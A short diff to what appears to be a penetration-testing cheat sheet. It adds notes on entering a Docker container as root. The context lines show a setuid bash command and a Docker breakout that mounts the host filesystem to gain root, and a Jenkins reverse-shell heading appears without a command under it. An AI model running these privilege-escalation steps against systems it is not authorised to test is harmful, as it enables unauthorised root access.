@@ -216,6 +216,10 @@ chmod +s /bin/bash
 > 1. If docker user is **root**.
 > 1. ```docker run -v /:/mnt --rm -it alpine chroot /mnt /sh```
 > 1. The above command will download a new alpine image, giving us root user access. Can be checked with ```id``` command.
+	
+#### Docker goinside a container
+>1. First check what docker containers are running by runnig ```docker ps```. 
+>1. To go inside a container, run ```bash docker exec -it -u 0 <container id> /bin/sh``` or ```bash docker exec -it -u 0 <container id> /bin/bash```
 
 ### Jenkis reverse shell - Linux
 ```bash
